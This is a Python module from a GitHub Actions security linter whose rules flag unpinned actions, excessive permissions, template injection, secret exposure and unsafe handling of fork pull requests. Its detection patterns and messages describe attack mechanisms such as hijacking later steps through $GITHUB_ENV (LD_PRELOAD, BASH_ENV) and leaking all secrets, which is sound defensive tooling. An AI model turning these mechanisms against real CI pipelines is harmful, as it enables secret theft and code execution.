"""The checks. Each rule takes a parsed workflow and yields findings.

The rules follow GitHub's own "Security hardening for GitHub Actions" guidance; see the README
for the reasoning and links behind each one.
"""

from __future__ import annotations

import math
import re
from collections.abc import Callable, Iterator
from dataclasses import dataclass, replace
from functools import lru_cache
from itertools import groupby, product
from pathlib import Path

from yaml.nodes import MappingNode, Node, ScalarNode, SequenceNode

from . import jscript
from .conditions import (
    ASSOCIATION,
    NO_ANSWERS,
    UNKNOWN,
    UNTRUSTED_ASSOCIATIONS,
    lets_in,
    may_pass,
    must_pass,
    status_functions,
    stranger_text,
    text_value,
)
from .conditions import Node as ConditionNode
from .conditions import parse as parse_condition
from .expressions import (
    ContextPath,
    Expression,
    ExpressionError,
    context_paths,
    find_expressions,
    matches,
)
from .model import Finding, Severity
from .project import repo_root
from .scripts import scripts
from .shell import always_fails, api_fails, script_outputs
from .taint import INPUT, OUTSIDER, TOJSON, Taint, Tracker
from .workflow import Step, Workflow, get, items, key_node, scalar


@dataclass(frozen=True)
class Rule:
    id: str
    name: str
    summary: str
    check: Callable[[Workflow], Iterator[Finding]]
    help: str = ""
    """Why it matters and how to fix it; shown in code scanning (SARIF ``help``)."""


def _at(
    wf: Workflow, node: Node, rule_id: str, severity: Severity, message: str, line_offset: int = 0
) -> Finding:
    mark = node.start_mark
    return Finding(wf.path, mark.line + 1 + line_offset, mark.column + 1, rule_id, severity, message)


# --- WG001 unpinned actions -------------------------------------------------------------------

_SHA = re.compile(r"^[0-9a-f]{40}$")
# Actions maintained by GitHub itself. A moved tag there is far less likely than in a
# third-party action, so it's reported, but as low.
_FIRST_PARTY = ("actions/", "github/")


def unpinned_actions(wf: Workflow) -> Iterator[Finding]:
    for uses in wf.uses_nodes():
        yield from _check_uses(wf, uses)


def _check_uses(wf: Workflow, node: Node) -> Iterator[Finding]:
    ref = scalar(node)
    if not ref or ref.startswith("./"):
        return  # local actions live in this repository
    if ref.startswith("docker://"):
        if "@sha256:" not in ref:
            yield _at(
                wf,
                node,
                "WG001",
                Severity.MEDIUM,
                f"'{ref}' uses a Docker tag that can change; pin it with @sha256:<digest>",
            )
        return
    name, _, version = ref.partition("@")
    if not version:
        yield _at(wf, node, "WG001", Severity.HIGH, f"'{ref}' has no version at all; pin it to a commit SHA")
    elif not _SHA.match(version):
        severity = Severity.LOW if name.startswith(_FIRST_PARTY) else Severity.HIGH
        yield _at(
            wf,
            node,
            "WG001",
            severity,
            f"'{ref}' points to a tag or branch that can be moved; pin it to a full commit SHA",
        )


# --- WG002 / WG003 permissions --------------------------------------------------------------


def missing_permissions(wf: Workflow) -> Iterator[Finding]:
    if get(wf.root, "permissions") is not None:
        return
    without = [job_id for job_id, job in wf.jobs() if get(job, "permissions") is None]
    if without:
        node = key_node(wf.root, "jobs") or wf.root
        yield _at(
            wf,
            node,
            "WG002",
            Severity.MEDIUM,
            "no 'permissions:' at the top or in job(s) "
            + ", ".join(without)
            + "; the GITHUB_TOKEN gets the repository default, which may allow writes."
            " Add e.g. 'permissions: contents: read'",
        )


def write_all(wf: Workflow) -> Iterator[Finding]:
    candidates: list[tuple[str, Node | None]] = [("workflow", get(wf.root, "permissions"))]
    candidates += [(f"job '{job_id}'", get(job, "permissions")) for job_id, job in wf.jobs()]
    for where, node in candidates:
        if scalar(node) == "write-all":
            yield _at(
                wf, node, "WG003", Severity.HIGH, f"{where} grants 'write-all'; list only the scopes it needs"
            )


# --- WG004 template injection ---------------------------------------------------------------

_ADVICE = "pass it through 'env:' and use the variable instead"


def _other_callers(taint: Taint) -> str:
    """The end of a message for an input that several local callers fill with untrusted text."""
    if not taint.callers:
        return ""
    return f"; other callers pass untrusted text too: {'; '.join(taint.callers)}"


def _injection_message(path: ContextPath, taint: Taint) -> str:
    return _injection_text(path, taint) + _other_callers(taint)


def _injection_text(path: ContextPath, taint: Taint) -> str:
    """Direct uses keep their short message; a detour through env/outputs is spelled out."""
    if not taint.via:
        if taint.kind == TOJSON:
            return (
                f"toJSON({taint.source}) includes values outsiders can set, such as '{taint.example}',"
                f" and is pasted into a script; {_ADVICE}"
            )
        if taint.kind == INPUT:
            return (
                f"'{taint.source}' comes from the calling workflow, which may pass untrusted"
                f" text, and is pasted into a script; {_ADVICE}"
            )
        return f"'{taint.source}' can be set by outsiders and is pasted into a script; {_ADVICE}"

    origin = _origin(taint)
    if path.segments[0] == "env":
        # The variable is already in the environment: the shell can read it without pasting.
        name = taint.via[-1].split(" ", 1)[0].removeprefix("env.").removeprefix("$")
        advice = f'use the shell variable "${name}" instead'
    else:
        advice = _ADVICE
    return f"'{path}' carries {origin} (via {' -> '.join(taint.via)}) and is pasted into a script; {advice}"


def template_injection(wf: Workflow) -> Iterator[Finding]:
    tracker = Tracker(wf)
    for tracked in tracker.steps():
        for script in scripts(tracked.step, wf.script_inputs):
            node = script.node
            for expr in find_expressions(node.value):
                hit = tracker.taint_of_expression(expr, tracked.scope)
                if hit is None:
                    continue
                offset = node.value.count("\n", 0, expr.start)
                if node.style in ("|", ">"):
                    offset += 1  # the text starts on the line after "run: |"
                path, taint = hit
                message = _injection_message(path, taint) + script.hint()
                yield _at(wf, node, "WG004", taint.severity, message, line_offset=offset)


# --- WG007 untrusted text in $GITHUB_ENV / $GITHUB_PATH ----------------------------------------


def _origin(taint: Taint) -> str:
    return {
        OUTSIDER: f"'{taint.source}', which outsiders can set",
        TOJSON: f"toJSON({taint.source}), which includes values outsiders can set",
        INPUT: f"'{taint.source}' from the calling workflow, which may be untrusted",
    }[taint.kind]


_FILE_EFFECT = {
    "ENV": (
        "$GITHUB_ENV",
        "a line break in it can set any variable for the later steps (BASH_ENV, LD_PRELOAD,"
        " NODE_OPTIONS...), which runs code of the sender's choosing",
    ),
    "PATH": (
        "$GITHUB_PATH",
        "it can put a directory of the sender's choosing first in PATH for the later steps",
    ),
}


def untrusted_github_env(wf: Workflow) -> Iterator[Finding]:
    for tracked in Tracker(wf).steps():
        for write in tracked.writes:
            if write.key == "run":
                node = get(tracked.step.node, "run")
            else:
                node = get(get(tracked.step.node, "with"), "script")
            if not isinstance(node, ScalarNode):
                continue
            target, effect = _FILE_EFFECT[write.file]
            via = f" (via {' -> '.join(write.taint.via)})" if write.taint.via else ""
            offset = write.line + (1 if node.style in ("|", ">") else 0)
            yield _at(
                wf,
                node,
                "WG007",
                write.taint.severity,
                f"{_origin(write.taint)}{via} is written to {target}; {effect}."
                f" Keep it in a step output or a file instead{_other_callers(write.taint)}",
                line_offset=offset,
            )


# --- WG008 secrets exposure --------------------------------------------------------------------


def _scalars(node: Node | None, skip: tuple[Node, ...] = ()) -> Iterator[ScalarNode]:
    """Every scalar value under ``node`` (mapping keys excluded), leaving out the nodes in
    ``skip`` and everything under them."""
    if any(node is s for s in skip):
        return
    if isinstance(node, ScalarNode):
        yield node
    elif isinstance(node, MappingNode):
        for _key, value in node.value:
            yield from _scalars(value, skip)
    elif isinstance(node, SequenceNode):
        for item in node.value:
            yield from _scalars(item, skip)


def _expression_offset(node: ScalarNode, start: int) -> int:
    offset = node.value.count("\n", 0, start)
    return offset + 1 if node.style in ("|", ">") else offset


def _is_all_secrets(path: ContextPath) -> bool:
    return path.segments == ("secrets",) and path.function == "tojson"


def secrets_exposure(wf: Workflow) -> Iterator[Finding]:
    # toJSON(secrets): every secret of the repository in one value, wherever it is used.
    for node in _scalars(wf.root):
        for expr in find_expressions(node.value):
            if any(_is_all_secrets(path) for path in _paths(expr)):
                yield _at(
                    wf,
                    node,
                    "WG008",
                    Severity.HIGH,
                    "toJSON(secrets) puts every secret of the repository into one value; a single"
                    " log line, artifact or compromised step then leaks all of them. Pass only the"
                    " secrets this step needs, one by one",
                    line_offset=_expression_offset(node, expr.start),
                )

    # ${{ secrets.X }} pasted into a script.
    for step in wf.steps():
        for script in scripts(step, wf.script_inputs):
            node = script.node
            for expr in find_expressions(node.value):
                path = next(
                    (p for p in _paths(expr) if p.segments[0] == "secrets" and not _is_all_secrets(p)),
                    None,
                )
                if path is None:
                    continue
                name = str(path) if len(path.segments) > 1 else "secrets[...]"
                yield _at(
                    wf,
                    node,
                    "WG008",
                    Severity.MEDIUM,
                    f"'{name}' is pasted into the script text: quotes or '$' in the secret break the"
                    " script, and 'set -x', an error message or a process listing can show it."
                    f" Pass it through 'env:' and use the variable instead{script.hint()}",
                    line_offset=_expression_offset(node, expr.start),
                )

    # secrets: inherit to a reusable workflow in another repository.
    for job_id, job in wf.jobs():
        uses = scalar(get(job, "uses")) or ""
        if not uses or uses.startswith("./") or scalar(get(job, "secrets")) != "inherit":
            continue
        yield _at(
            wf,
            get(job, "secrets") or job,
            "WG008",
            Severity.MEDIUM,
            f"job '{job_id}' passes all of this repository's secrets ('secrets: inherit') to"
            f" '{uses}', a workflow in another repository; list the secrets it needs instead",
        )


def _paths(expr: Expression) -> list[ContextPath]:
    try:
        return context_paths(expr.inner)
    except ExpressionError:
        return []  # GitHub rejects the workflow before anything runs


# --- WG005 pull_request_target ---------------------------------------------------------------

_PR_HEAD = (
    ("github", "event", "pull_request", "head", "sha"),
    ("github", "event", "pull_request", "head", "ref"),
    ("github", "head_ref"),
)


def _checks_out_pr_code(ref: str) -> bool:
    """``ref:`` of actions/checkout naming the pull request's code: its head, by expression,
    or GitHub's ``refs/pull/<n>/head`` / ``merge`` refs."""
    if "refs/pull/" in ref:
        return True
    return any(
        matches(path.segments, pattern)
        for expr in find_expressions(ref)
        for path in _paths(expr)
        for pattern in _PR_HEAD
    )


def pull_request_target(wf: Workflow) -> Iterator[Finding]:
    if "pull_request_target" not in wf.triggers():
        return
    risky = False
    for step in wf.steps():
        if (step.uses or "").startswith("actions/checkout@"):
            if _checks_out_pr_code(step.with_value("ref") or ""):
                risky = True
                yield _at(
                    wf,
                    step.node,
                    "WG005",
                    Severity.HIGH,
                    "checks out the pull request's code under 'pull_request_target', which runs"
                    " with secrets and a write token; a fork's PR can then run its own code",
                )
    if not risky:
        node = key_node(wf.root, "on") or wf.root
        yield _at(
            wf,
            node,
            "WG005",
            Severity.LOW,
            "'pull_request_target' runs with secrets for pull requests from forks;"
            " make sure no step runs code from the pull request",
        )


# --- WG006 persisted credentials -------------------------------------------------------------


def persisted_credentials(wf: Workflow) -> Iterator[Finding]:
    for step in wf.steps():
        if not (step.uses or "").startswith("actions/checkout@"):
            continue
        if (step.with_value("persist-credentials") or "").lower() != "false":
            yield _at(
                wf,
                get(step.node, "uses") or step.node,
                "WG006",
                Severity.LOW,
                "actions/checkout leaves the token in .git/config for later steps;"
                " set 'persist-credentials: false' unless a step pushes",
            )


# --- WG009 workflow_run with the triggering run's code or artifacts ---------------------------

# The triggering run's commit: a fork's pull request when that run was a 'pull_request'.
_RUN_HEAD = (
    ("github", "event", "workflow_run", "head_sha"),
    ("github", "event", "workflow_run", "head_branch"),
    ("github", "event", "workflow_run", "head_commit"),
    ("github", "event", "workflow_run", "head_repository"),
    ("github", "event", "workflow_run", "pull_requests"),
)
# Triggers whose runs can carry a fork's code (a workflow_run chain can pass it on).
_UNTRUSTED_TRIGGERS = ("pull_request", "workflow_run")
_WORKSPACE_PATHS = {"", ".", "${{github.workspace}}", "$github_workspace", "${github_workspace}"}
_GH_RUN_DOWNLOAD = re.compile(r"\bgh\s+run\s+download\b")
_GH_RUN_DIR = re.compile(r"\s(?:-D|--dir)(?:\s|=)")
_FORK_RUN = "the triggering run can be a pull request from a fork"
# Any part of the triggering run: what `gh pr checkout` needs (a PR number, a branch name).
_RUN_ANY = (("github", "event", "workflow_run"),)
# git commands that bring a commit into the working tree, and `gh pr checkout`.
_GIT_CHECKOUT = re.compile(
    r"\bgit\s+(?:-[cC]\s+\S+\s+)*(?:checkout|switch|fetch|pull|reset|worktree\s+add)\b"
)
_GH_PR_CHECKOUT = re.compile(r"\bgh\s+pr\s+checkout\b")
_SHELL_VAR = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)")


def _names(text: str, patterns: tuple[tuple[str, ...], ...], env_vars: frozenset[str] = frozenset()) -> bool:
    """True if ``text`` refers to one of ``patterns``: in a ``${{ }}``, or through an ``env:``
    variable in ``env_vars`` (lower case), as ``${{ env.X }}`` or as ``$X`` in a script."""
    for expr in find_expressions(text):
        for path in _paths(expr):
            if any(matches(path.segments, pattern) for pattern in patterns):
                return True
            if len(path.segments) > 1 and path.segments[0] == "env" and path.segments[1] in env_vars:
                return True
    return any(name.lower() in env_vars for name in _SHELL_VAR.findall(text))


def _names_run_head(text: str) -> bool:
    return _names(text, _RUN_HEAD)


def _env_naming(patterns: tuple[tuple[str, ...], ...], *scopes: Node | None) -> frozenset[str]:
    """Names (lower case) of ``env:`` variables in these scopes whose value refers to
    ``patterns``. Later scopes override earlier ones, as in GitHub (workflow, job, step)."""
    env: dict[str, str] = {}
    for scope in scopes:
        for name, value in items(get(scope, "env")):
            env[name.lower()] = scalar(value) or ""
    return frozenset(name for name, value in env.items() if _names(value, patterns))


def _script_checks_out_run(run: str, head_vars: frozenset[str], run_vars: frozenset[str]) -> bool:
    """A ``run:`` script that checks out the triggering run's commit: ``git checkout/fetch/...``
    of its head, or ``gh pr checkout`` of its pull request."""
    for line in run.replace("\\\n", " ").splitlines():
        if _GIT_CHECKOUT.search(line) and _names(line, _RUN_HEAD, head_vars):
            return True
        if _GH_PR_CHECKOUT.search(line) and _names(line, _RUN_ANY, run_vars):
            return True
    return False


def _branch_filter_note(wf: Workflow) -> str:
    """``branches:`` under ``on.workflow_run`` looks like protection but isn't."""
    trigger = get(get(wf.root, "on"), "workflow_run")
    for key in ("branches", "branches-ignore"):
        if get(trigger, key) is not None:
            return (
                f" ('{key}:' under 'on.workflow_run' doesn't prevent that: it matches the branch"
                " name of the fork's pull request, which the fork picks)"
            )
    return ""


def _workflow_name(wf: Workflow, root: Path) -> str:
    """What ``on.workflow_run.workflows`` calls ``wf``: its ``name:``, else its path."""
    if name := scalar(get(wf.root, "name")):
        return name
    path = Path(wf.path).resolve()
    return path.relative_to(root).as_posix() if path.is_relative_to(root) else wf.path


def _fork_runs(wf: Workflow) -> str | None:
    """Why the triggering run's code and artifacts may be a stranger's; None when every
    workflow named under ``on.workflow_run.workflows`` is among the checked files and none of
    them runs for pull requests (their runs then only build this repository's own commits)."""
    listed = get(get(get(wf.root, "on"), "workflow_run"), "workflows")
    if isinstance(listed, SequenceNode):
        names = [n.value for n in listed.value if isinstance(n, ScalarNode)]
    else:
        names = [listed.value] if isinstance(listed, ScalarNode) else []
    root = repo_root(Path(wf.path))
    if wf.project is None or root is None or not names:
        return _FORK_RUN
    known = {
        _workflow_name(other, root): other
        for other in wf.project.files.values()
        if not other.is_action and repo_root(Path(other.path)) == root
    }
    reasons = []
    for name in names:
        if (other := known.get(name)) is None:
            return _FORK_RUN
        if found := [t for t in _UNTRUSTED_TRIGGERS if t in other.triggers()]:
            reasons.append(f"'{name}' runs on {found[0]}")
    if not reasons:
        return None
    return f"{', '.join(reasons)}, so the triggering run can be a pull request from a fork"


def _in_workspace(path: str) -> bool:
    return re.sub(r"\s+", "", path.lower()).rstrip("/") in _WORKSPACE_PATHS


def _artifact_download(step: Step) -> bool | None:
    """None if the step doesn't download another run's artifacts; else whether it unpacks them
    straight into the workspace, where they can replace the repository's own files."""
    uses = step.uses or ""
    if uses.startswith("actions/download-artifact@"):
        if step.with_value("run-id") is None:
            return None  # this run's own artifacts
        return _in_workspace(step.with_value("path") or "")
    if uses.startswith("dawidd6/action-download-artifact@"):
        return _in_workspace(step.with_value("path") or "")
    if uses.startswith("actions/github-script@") and "downloadArtifact" in (step.with_value("script") or ""):
        return False  # the script decides where the zip goes; at least it isn't unpacked yet
    run = scalar(get(step.node, "run")) or ""
    if _GH_RUN_DOWNLOAD.search(run):
        return not _GH_RUN_DIR.search(run)
    return None


def _runs_workspace_code(step: Step) -> bool:
    return get(step.node, "run") is not None or (step.uses or "").startswith("./")


def workflow_run(wf: Workflow) -> Iterator[Finding]:
    if wf.is_action or "workflow_run" not in wf.triggers():
        return
    if (why := _fork_runs(wf)) is None:
        return
    why += _branch_filter_note(wf)
    jobs = dict(wf.jobs())
    for job_id, job_steps in groupby(wf.steps(), key=lambda step: step.job_id):
        steps = list(job_steps)
        for i, step in enumerate(steps):
            scopes = (wf.root, jobs.get(job_id), step.node)
            run = scalar(get(step.node, "run"))
            if run is not None and _script_checks_out_run(
                run, _env_naming(_RUN_HEAD, *scopes), _env_naming(_RUN_ANY, *scopes)
            ):
                yield _at(
                    wf,
                    step.node,
                    "WG009",
                    Severity.HIGH,
                    "checks out the triggering run's code with git or gh in a script, under"
                    f" 'workflow_run', which runs with secrets and a write token; {why}, and its"
                    " code then runs here",
                )
                continue
            if (step.uses or "").startswith("actions/checkout@"):
                if _names_run_head(step.with_value("ref") or "") or _names_run_head(
                    step.with_value("repository") or ""
                ):
                    yield _at(
                        wf,
                        step.node,
                        "WG009",
                        Severity.HIGH,
                        "checks out the triggering run's code under 'workflow_run', which runs with"
                        f" secrets and a write token; {why}, and its code then runs here",
                    )
                continue
            if (into_workspace := _artifact_download(step)) is None:
                continue
            later = next((s for s in steps[i + 1 :] if _runs_workspace_code(s)), None)
            if into_workspace and later is not None:
                yield _at(
                    wf,
                    step.node,
                    "WG009",
                    Severity.HIGH,
                    "unpacks the triggering run's artifacts into the workspace, where they can"
                    " replace the repository's scripts and config, and the step at line"
                    f" {later.node.start_mark.line + 1} runs commands there with secrets; {why}."
                    " Download to ${{ runner.temp }} instead and treat the files as data",
                )
            else:
                yield _at(
                    wf,
                    step.node,
                    "WG009",
                    Severity.MEDIUM,
                    f"downloads the triggering run's artifacts under 'workflow_run'; {why}."
                    " Treat their contents as untrusted data: don't run or source them, and don't"
                    " paste them into scripts or $GITHUB_ENV",
                )


# --- WG010 comment commands without a check of the commenter ---------------------------------

# Who wrote the comment: checking one of these in an 'if:' is a permission check.
_COMMENTER = (
    ("github", "event", "comment", "author_association"),
    ("github", "event", "comment", "user", "login"),
    ("github", "event", "sender", "login"),
    ("github", "actor"),
    ("github", "triggering_actor"),
)
_COMMENT_BODY = (("github", "event", "comment", "body"),)
# Actions that check the commenter's permission. They fail the step unless the commenter may
# write, except where an input decides: action -> None (always fails), or (input, whether the
# step fails when that input is "true").
_PERMISSION_ACTIONS: dict[str, tuple[str, bool] | None] = {
    # Only sets outputs (require-result, check-result) unless error-if-missing: true.
    "actions-cool/check-user-permission": ("error-if-missing", True),
    "prince-chrismc/check-actor-permissions-action": None,
    # relax: true reports 'permitted: false' and exits 0.
    "sushichop/action-repository-permission": ("relax", False),
    "lannonbr/repo-permission-check-action": None,
    "xt0rted/slash-command-action": None,
    "peter-evans/slash-command-dispatch": None,
}
# Outputs of a reporting action that are never empty, with what they say to a commenter who
# can't write, and the input that has to be set for the output to be written ("" for none).
# actions-cool/check-user-permission (src/main.js): user-permission is always set from
# getCollaboratorPermissionLevel, require-result only when `require` is given.
_ACTION_ANSWERS: dict[str, dict[str, tuple[tuple[str, ...], str]]] = {
    "actions-cool/check-user-permission": {
        "user-permission": (("none", "read"), ""),
        "require-result": (("false",), "require"),
    },
}
_PERMISSION_API = re.compile(
    r"getCollaboratorPermissionLevel|collaborators/(?:\$\{\{[^}]*\}\}|[^\s/])+/permission"
)
# A script that fails when the answer is no: github-script (core.setFailed, throw,
# process.exit(1)) or shell (exit 1; a `| grep -q` that isn't the condition of an if, && or ||,
# which fails the step under bash -e).
_STOPS = re.compile(
    r"core\.setFailed\s*\(|\bthrow\b|process\.exit\s*\(\s*[1-9]|\bexit\s+[1-9]"
    r"|^(?![ \t]*(?:if|elif|while|until)\b)(?!.*(?:&&|\|\|)).*\|\s*grep\s+-\w*q",
    re.MULTILINE,
)
# A script that fails whenever it runs (in a step whose 'if:' decides when that is).
_ALWAYS_FAILS = re.compile(r"core\.setFailed\s*\(|\bthrow\b|process\.exit\s*\(\s*[1-9]|\bexit\s+[1-9]")
_FAILS, _REPORTS = "fails", "reports"
# A ref naming the pull request: its number, its head, or a value looked up at run time.
_PR_REF = (
    ("github", "event", "issue", "number"),
    ("github", "event", "issue", "pull_request"),
    ("github", "event", "pull_request"),
    ("github", "head_ref"),
    ("steps",),
    ("needs",),
)
# A pull request's ref in a script: pull/<n>/head, pull/<n>/merge, refs/pull/...
_PR_REF_TEXT = re.compile(r"\bpull/(?:\$\{\{[^}]*\}\}|[^\s/]+)/(?:head|merge)\b|refs/pull/")


def _pr_script(text: str) -> bool:
    """``gh pr checkout``, or a git command that brings a commit in (fetch, checkout...) with a
    pull request's ref on the same line (``\\`` continuations joined). A ref that is only echoed
    or saved (``echo "REF=refs/pull/1/merge" >> $GITHUB_ENV``) checks nothing out."""
    if _GH_PR_CHECKOUT.search(text):
        return True
    lines = text.replace("\\\n", " ").splitlines()
    return any(_GIT_CHECKOUT.search(line) and _PR_REF_TEXT.search(line) for line in lines)


def _if_paths(node: Node | None) -> list[ContextPath]:
    """Context paths in an ``if:``, written with or without ``${{ }}``."""
    text = _if_text(node)
    try:
        return context_paths(text) if text else []
    except ExpressionError:
        return []


def _if_text(node: Node | None) -> str:
    text = (scalar(get(node, "if")) or "").strip()
    if text.startswith("${{") and text.endswith("}}"):
        text = text[3:-2]
    return text


def _commenter_gate(node: Node | None) -> tuple[bool, str]:
    """Whether the ``if:`` of ``node`` keeps out commenters who can't write (by who commented,
    or because it never runs for a comment: ``github.event_name == 'push'``), and if it looks at
    who commented but doesn't, who it still lets in (to follow "still lets")."""
    text = _if_text(node)
    if not text:
        return False, ""
    try:
        passing = lets_in(text)
    except ExpressionError:
        return False, ""
    if not passing:
        return True, ""
    paths = _if_paths(node)
    if not _mentions(paths, _COMMENTER):
        return False, ""
    return False, _who(passing, _mentions(paths, (ASSOCIATION,)))


def _who(passing: tuple[str, ...], by_association: bool = True) -> str:
    """Who a weak check still lets in (to follow "still lets")."""
    if not by_association:
        return "in every account it doesn't name"
    who = ", ".join(passing[:-1]) + (" and " if len(passing) > 1 else "") + passing[-1]
    return f"{who} in: author_association values of people who can't write to the repository"


def _weak_note(node: Node | None, subject: str) -> str:
    who = _commenter_gate(node)[1]
    return f" ({subject} looks at who commented but still lets {who})" if who else ""


def _mentions(paths: list[ContextPath], patterns: tuple[tuple[str, ...], ...]) -> bool:
    return any(matches(path.segments, pattern) for path in paths for pattern in patterns)


def _truthy(value: str | None) -> bool:
    return (value or "").strip().lower() == "true"


def _continues(step: Step) -> bool:
    return _truthy(scalar(get(step.node, "continue-on-error")))


def _asks(step: Step) -> bool | None:
    """Whether a step that asks for the commenter's permission fails on a no (leaving
    ``continue-on-error`` aside), or None if it doesn't ask."""
    action = (step.uses or "").split("@", 1)[0].lower()
    if action in _PERMISSION_ACTIONS:
        switch = _PERMISSION_ACTIONS[action]
        return switch is None or _truthy(step.with_value(switch[0])) == switch[1]
    run = scalar(get(step.node, "run")) or ""
    text = run + (step.with_value("script") or "")
    if not _PERMISSION_API.search(text):
        return None
    shell = (scalar(get(step.node, "shell")) or "bash").split()[0].lower()
    if run and shell in ("bash", "sh"):
        env = items(get(step.node, "env"))
        verdict = _api_verdict(run, tuple(sorted((k, v.value) for k, v in env if isinstance(v, ScalarNode))))
        if verdict is not None:
            return verdict
    js = _js_results(step)
    if js is not None and all(result.asked for result in js):
        return all(result.fails for result in js)
    # A script the evaluators don't follow: guess from the text.
    return bool(_STOPS.search(text))


def _is_github_script(step: Step) -> bool:
    return (step.uses or "").split("@", 1)[0].lower() == "actions/github-script"


def _js_results(step: Step) -> list[jscript.Result] | None:
    """An ``actions/github-script`` step run on paper (``jscript.run``) for each association
    that can't write; None for another step or a script the evaluator doesn't follow."""
    script = step.with_value("script")
    if not _is_github_script(step) or not script:
        return None
    encoding = (step.with_value("result-encoding") or "json").strip().lower()
    return _js_run(script, encoding)


@lru_cache(maxsize=1024)
def _js_run(script: str, encoding: str) -> list[jscript.Result] | None:
    expressions = list(find_expressions(script))
    pasted = jscript.paste(script, [(e.start, e.end) for e in expressions])
    results = []
    for association in UNTRUSTED_ASSOCIATIONS:
        values = {n: stranger_text(script[e.start : e.end], association) for n, e in enumerate(expressions)}
        result = jscript.run(pasted, values, association, encoding)
        if result is None:
            return None
        results.append(result)
    return results


_JS_COMMENTER = re.compile(
    r"context\.(?:actor|triggering_actor)\b|comment\.(?:user\.login|author_association)|sender\.login"
)


def _js_looks(step: Step) -> bool:
    """A github-script that looks at who commented: through ``context``, ``${{ }}`` or the
    permission API."""
    script = step.with_value("script") or ""
    return bool(
        _JS_COMMENTER.search(script)
        or _PERMISSION_API.search(script)
        or any(_mentions(_paths(expr), _COMMENTER) for expr in find_expressions(script))
    )


def _js_stops(step: Step) -> bool:
    """A github-script that looks at who commented and fails for every commenter who can't
    write (``core.setFailed``, a throw), without asking the permission API."""
    if _continues(step) or not _js_looks(step):
        return False
    results = _js_results(step)
    return results is not None and all(result.fails for result in results)


def _permission_check(step: Step) -> str | None:
    """How a step checks the commenter's permission: ``_FAILS`` (the step fails, and so stops
    the job, unless they may write), ``_REPORTS`` (it only puts the answer in an output or its outcome)
    or None (it doesn't ask)."""
    fails = _asks(step)
    if fails is None:
        return None
    return _FAILS if fails and not _continues(step) else _REPORTS


def _job_steps(wf: Workflow, job_id: str) -> list[Step]:
    return [step for step in wf.steps() if step.job_id == job_id]


@dataclass(frozen=True)
class _Stop:
    """A step that fails unless the commenter may write."""

    index: int
    step: Step
    sure: bool
    """It runs for every commenter who can't write (no ``if:``, or one that is true for them);
    otherwise it covers only the steps whose ``if:`` has its condition too."""


def _stops(wf: Workflow, job_id: str) -> list[_Stop]:
    """The job's steps that fail unless the commenter may write: one that asks and fails on a no,
    one that fails on the answer of a step before it that only reports (its ``if:`` is about
    that answer, so it always runs when it should), or a script that checks who commented and
    exits for everyone who can't write."""
    steps = _job_steps(wf, job_id)
    stops = []
    for i, step in enumerate(steps):
        if _denies(step, [s for s in steps[:i] if _is_answer(s)]):
            stops.append(_Stop(i, step, True))
        elif (
            _permission_check(step) == _FAILS
            or (_shell_check(wf, step) == () and not _continues(step))
            or (_permission_check(step) is None and _js_stops(step))
        ):
            stops.append(_Stop(i, step, _always_runs(step)))
    return stops


def _stop_step(wf: Workflow, job_id: str) -> Step | None:
    """The job's first step that fails unless the commenter may write and that always runs for
    them: then the whole job fails for them."""
    return next((stop.step for stop in _stops(wf, job_id) if stop.sure), None)


def _condition(node: Node | None) -> ConditionNode | None:
    """A node's ``if:`` parsed, None if it has none or it isn't an expression."""
    text = _if_text(node)
    if not text:
        return None
    try:
        return parse_condition(text)
    except ExpressionError:
        return None


def _conjuncts(node: Node | None) -> set[str] | None:
    """The parts of a node's ``if:`` joined by ``&&`` at the top (as parsed trees), None if it
    has no ``if:`` or isn't an expression."""
    tree = _condition(node)
    return None if tree is None else _parts(tree)


def _parts(tree: ConditionNode) -> set[str]:
    parts, todo = set(), [tree]
    while todo:
        part = todo.pop()
        if part.kind == "and":
            todo += part.children
        else:
            parts.add(repr(part))
    return parts


def _covers(stop: _Stop, step: Step) -> bool:
    """A stop before ``step`` stops a stranger before it: it always runs, or ``step``'s
    ``if:`` has every condition of the stop's (so when the stop is skipped, so is ``step``)."""
    if stop.sure:
        return True
    needed, has = _conjuncts(stop.step.node), _conjuncts(step.node)
    return needed is not None and has is not None and needed <= has


def _always_runs(step: Step) -> bool:
    """The step's ``if:`` (if any) is true for every commenter who can't write: a script that
    exits for them only stops them if it runs."""
    text = _if_text(step.node)
    if not text:
        return True
    try:
        return must_pass(text, lambda path: UNKNOWN)
    except ExpressionError:
        return False


def _shell(wf: Workflow, step: Step) -> str | None:
    """The shell a ``run:`` step uses: its ``shell:``, the job's or workflow's
    ``defaults.run.shell``, else bash (pwsh on a Windows runner, None when unknown)."""
    job = dict(wf.jobs()).get(step.job_id)
    for node in (step.node, get(get(job, "defaults"), "run"), get(get(wf.root, "defaults"), "run")):
        shell = scalar(get(node, "shell"))
        if shell:
            return shell.split()[0].lower()
    runs_on = scalar(get(job, "runs-on")) or ""
    return "pwsh" if "windows" in runs_on.lower() else "bash"


def _shell_check(wf: Workflow, step: Step) -> tuple[str, ...] | None:
    """For a bash ``run:`` script that looks at who commented (through ``${{ }}`` or an
    ``env:`` variable): the associations without write access it may let through, empty if it
    exits for all of them (``shell.always_fails``). None for any other step."""
    found = _shell_inputs(wf, step, _COMMENTER)
    return None if found is None else _shell_passing(*found)


def _shell_inputs(
    wf: Workflow, step: Step, about: tuple[tuple[str, ...], ...]
) -> tuple[str, tuple[tuple[str, str], ...]] | None:
    """A bash ``run:`` script and the ``env:`` values it sees (workflow, job, step), if one of
    them mentions one of the paths ``about``."""
    script = scalar(get(step.node, "run"))
    if not script or _shell(wf, step) not in ("bash", "sh"):
        return None
    job = dict(wf.jobs()).get(step.job_id)
    env: dict[str, str] = {}
    for node in (wf.root, job, step.node):
        env.update(
            {key: value.value for key, value in items(get(node, "env")) if isinstance(value, ScalarNode)}
        )
    env = {name: value for name, value in env.items() if re.search(rf"\$\{{?{re.escape(name)}\b", script)}
    texts = [script, *env.values()]
    if not any(_mentions(_paths(expr), about) for text in texts for expr in find_expressions(text)):
        return None
    return script, tuple(sorted(env.items()))


# Variables GitHub sets for every step, as they are in a comment's run.
_DEFAULT_ENV = {
    "GITHUB_ACTOR": "${{ github.actor }}",
    "GITHUB_TRIGGERING_ACTOR": "${{ github.triggering_actor }}",
    "GITHUB_EVENT_NAME": "${{ github.event_name }}",
}


def _shell_run(script: str, env: tuple[tuple[str, str], ...]) -> tuple[str, dict[str, dict[str, object]]]:
    """The script with each ``${{ }}`` turned into a variable, and for each association that
    can't write the values of those variables and of ``env`` for a stranger."""
    inline: dict[str, str] = {}
    parts, pos = [], 0
    for i, expr in enumerate(find_expressions(script)):
        name = f"__WG_E{i}"
